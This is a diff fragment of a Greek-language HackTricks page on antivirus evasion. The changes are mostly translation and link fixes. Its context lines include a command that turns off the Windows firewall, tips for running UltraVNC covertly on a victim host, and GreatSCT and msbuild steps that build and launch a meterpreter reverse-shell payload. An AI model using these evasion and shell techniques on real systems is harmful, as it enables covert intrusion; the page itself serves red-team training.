+Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρέσει μέρη του δυαδικού αρχείου** μέχρι να **ανακαλύψει ποιο μέρος ο Defender** βρίσκει ως κακόβουλο και να το διαχωρίσει για εσάς.\
 Ένα άλλο εργαλείο που κάνει το **ίδιο πράγμα είναι** [**avred**](https://github.com/dobin/avred) με μια ανοιχτή ιστοσελίδα που προσφέρει την υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet Server**
@@ -374,7 +374,7 @@ netsh advfirewall set allprofiles state off
 
 **ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον διακομιστή:
 
-* Ενεργοποιήστε την επιλογή _Απενεργοποίηση TrayIcon_
+* Ενεργοποιήστε την επιλογή _Disable TrayIcon_
 * Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
 * Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_
 
@@ -387,8 +387,8 @@ netsh advfirewall set allprofiles state off
 **ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε την κρυψίνοια δεν πρέπει να κάνετε μερικά πράγματα
 
 * Μην ξεκινήσετε το `winvnc` αν είναι ήδη σε εκτέλεση ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). ελέγξτε αν είναι σε εκτέλεση με `tasklist | findstr winvnc`
-* Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο ή θα προκαλέσει το άνοιγμα του [παραθύρου ρύθμισης](https://i.imgur.com/rfMQWcf.png)
-* Μην εκτελείτε το `winvnc -h` για βοήθεια ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)
+* Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο ή θα προκαλέσει το άνοιγμα [του παραθύρου ρύθμισης](https://i.imgur.com/rfMQWcf.png)
+* Μην εκτελέσετε το `winvnc -h` για βοήθεια ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
@@ -410,7 +410,7 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-Τώρα **ξεκινήστε τον καταχωρητή** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
+Τώρα **ξεκινήστε τον καταγραφέα** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
@@ -507,7 +507,7 @@ catch (Exception err) { }
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57b815abe21ef04857b066)
+[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
 
 [REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
 
@@ -569,15 +569,15 @@ https://github.com/praetorian-code/vulcan
 
 * [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-<figure><img src="/.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Αν ενδιαφέρεστε για **καριέρα στον hacking** και να χακάρετε το μη χακάρισμα - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση πολωνικών, γραπτά και προφορικά_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
